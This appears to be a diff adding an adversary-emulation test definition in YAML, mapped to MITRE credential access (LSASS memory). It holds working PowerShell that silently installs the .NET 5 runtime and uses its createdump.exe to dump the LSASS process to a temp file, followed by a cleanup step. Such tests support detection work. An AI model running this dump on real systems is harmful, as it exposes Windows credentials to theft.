@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: Dump LSASS with createdump.exe from .Net v5
+description: |
+    Use createdump executable from .NET to create an LSASS dump.
+
+    [Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)
+uuid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.001: LSASS Memory'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        .Net v5 must be installed
+      inline: |
+        $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
+        if ($exePath -and (Test-Path $exePath)) {exit 0} else {{winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent
+        }}
+      executor: powershell
+    - name: dump-lsass-with-createdump.exe-from-.net-v5
+      inline: |
+        $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
+        & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
+        executor: powershell
